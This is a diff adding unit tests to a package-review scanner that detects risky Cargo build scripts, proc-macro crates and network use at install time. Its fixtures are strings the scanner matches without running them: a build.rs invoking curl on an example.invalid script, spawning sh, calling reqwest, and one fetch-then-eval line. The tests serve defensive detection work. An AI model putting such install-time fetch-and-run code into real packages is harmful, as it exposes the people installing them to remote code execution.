@@ -3165,4 +3165,117 @@ public sealed class PackageReviewTests : IDisposable
     {
         Assert.DoesNotContain(ConfigPackage("f-1.0.0.tgz", "fetch('https://example.com/x').then(r => r.text()).then(t => { eval(t); });\nmodule.exports = {};", "postcss.config.js").Findings, f => f.Rule == "package/code-store-eval");
     }
+
+    private const string CargoManifest = "[package]\nname = \"sample-tool\"\nversion = \"0.3.0\"\nauthors = [\"A Author\"]\n\n[dependencies]\nserde = \"1\"\n\n[build-dependencies]\ncc = \"1\"\n";
+
+    [Fact]
+    public void A_cargo_build_script_is_listed_as_an_install_script_and_read_by_the_install_rules()
+    {
+        // The script is text the reader matches; nothing runs it.
+        var r = Review(Tgz("sample-tool-0.3.0.crate",
+            ("sample-tool-0.3.0/Cargo.toml", CargoManifest),
+            ("sample-tool-0.3.0/build.rs", "fn main() { std::process::Command::new(\"curl\").arg(\"https://example.invalid/a.sh\"); }")));
+        Assert.Equal(("cargo", "sample-tool", "0.3.0", 1), (r.Ecosystem, r.Name, r.Version, r.Dependencies));
+        Assert.Contains(r.Scripts, s => s is { Name: "build", Command: "build.rs", AtInstall: true });
+        Assert.Contains(r.Findings, f => f is { Rule: "package/rust-process", Path: "sample-tool-0.3.0/build.rs" });
+        Assert.Contains(r.Notes, n => n.StartsWith("1 build dependency"));
+    }
+
+    [Fact]
+    public void A_cargo_crate_with_build_disabled_lists_no_install_script()
+    {
+        var r = Review(Tgz("sample-tool-0.3.0.crate",
+            ("sample-tool-0.3.0/Cargo.toml", CargoManifest.Replace("version = \"0.3.0\"", "version = \"0.3.0\"\nbuild = false")),
+            ("sample-tool-0.3.0/build.rs", "fn main() { std::process::Command::new(\"sh\"); }")));
+        Assert.Empty(r.Scripts);
+        Assert.DoesNotContain(r.Findings, f => f.Rule.StartsWith("package/rust-", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_cargo_build_set_to_true_reads_the_default_build_script()
+    {
+        var r = Review(Tgz("sample-tool-0.3.0.crate",
+            ("sample-tool-0.3.0/Cargo.toml", CargoManifest.Replace("version = \"0.3.0\"", "version = \"0.3.0\"\nbuild = true")),
+            ("sample-tool-0.3.0/build.rs", "fn main() { std::process::Command::new(\"sh\"); }")));
+        Assert.Contains(r.Findings, f => f.Rule == "package/rust-process");
+        Assert.DoesNotContain(r.Notes, n => n.Contains("does not hold"));
+    }
+
+    [Fact]
+    public void A_cargo_crate_without_a_build_script_lists_none()
+    {
+        var r = Review(Tgz("sample-tool-0.3.0.crate", ("sample-tool-0.3.0/Cargo.toml", CargoManifest)));
+        Assert.Empty(r.Scripts);
+    }
+
+    [Fact]
+    public void A_proc_macro_crate_gets_an_info_finding()
+    {
+        var r = Review(Tgz("sample-macro-0.1.0.crate",
+            ("sample-macro-0.1.0/Cargo.toml", CargoManifest + "\n[lib]\nproc-macro = true\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/proc-macro", Level: "info" });
+    }
+
+    [Fact]
+    public void A_cargo_build_script_naming_a_network_crate_gets_a_network_finding()
+    {
+        var r = Review(Tgz("sample-tool-0.3.0.crate",
+            ("sample-tool-0.3.0/Cargo.toml", CargoManifest),
+            ("sample-tool-0.3.0/build.rs", "fn main() { let _ = reqwest::blocking::get(\"https://example.invalid/a\"); }")));
+        Assert.Contains(r.Findings, f => f.Rule == "package/rust-network");
+    }
+
+    [Fact]
+    public void Rust_rules_do_not_read_files_that_are_not_rust_source()
+    {
+        var r = Review(Tgz("sample-1.0.0.tgz",
+            ("package/package.json", "{\"name\":\"s\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node run.js\"}}"),
+            ("package/run.js", "// Command::new(\"x\") is the Rust spelling\nconsole.log(1);\n/* reqwest::get */")));
+        Assert.DoesNotContain(r.Findings, f => f.Rule.StartsWith("package/rust-", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_nested_cargo_manifest_in_another_package_does_not_make_it_a_crate()
+    {
+        var r = Review(Tgz("addon-1.0.0.tgz",
+            ("package/package.json", "{\"name\":\"addon\",\"version\":\"1.0.0\"}"),
+            ("package/native/deep/Cargo.toml", CargoManifest)));
+        Assert.Equal("npm", r.Ecosystem);
+        Assert.Null(PackageReview.Review(Tgz("bare.tgz", ("bare/native/deep/Cargo.toml", CargoManifest)), default));
+    }
+
+    [Fact]
+    public void A_cargo_source_folder_is_reviewed_by_the_package_view()
+    {
+        var folder = _dir.File("crate-folder");
+        Directory.CreateDirectory(folder);
+        File.WriteAllText(Path.Combine(folder, "Cargo.toml"), CargoManifest);
+        File.WriteAllText(Path.Combine(folder, "build.rs"), "fn main() {}");
+        var view = new PackageFileView().Inspect(FileInput.Open(Path.Combine(folder, "Cargo.toml")), default);
+        Assert.NotNull(view);
+    }
+
+    [Fact]
+    public void A_cargo_build_path_the_crate_does_not_hold_is_noted()
+    {
+        var r = Review(Tgz("sample-tool-0.3.0.crate",
+            ("sample-tool-0.3.0/Cargo.toml", CargoManifest.Replace("version = \"0.3.0\"", "version = \"0.3.0\"\nbuild = \"gen/setup.rs\""))));
+        Assert.Contains(r.Notes, n => n.Contains("gen/setup.rs, which the package does not hold"));
+    }
+
+    [Fact]
+    [FuzzEntry(typeof(PackageReview))]
+    public void Fuzzed_cargo_crates_never_throw()
+    {
+        var seed = Encoding.UTF8.GetBytes(CargoManifest + "[lib]\nproc-macro = true\n[[bin]]\nname = \"x\"\n");
+        var folder = _dir.File("fuzz-cargo");
+        Directory.CreateDirectory(folder);
+        File.WriteAllText(Path.Combine(folder, "build.rs"), "fn main() {}");
+        var failures = FormatFuzz.Run(seed, b =>
+        {
+            File.WriteAllBytes(Path.Combine(folder, "Cargo.toml"), b);
+            _ = PackageReview.Review(folder, default);
+        }, 100);
+        Assert.True(failures.Count == 0, string.Join("\n", failures.Take(20)));
+    }
 }
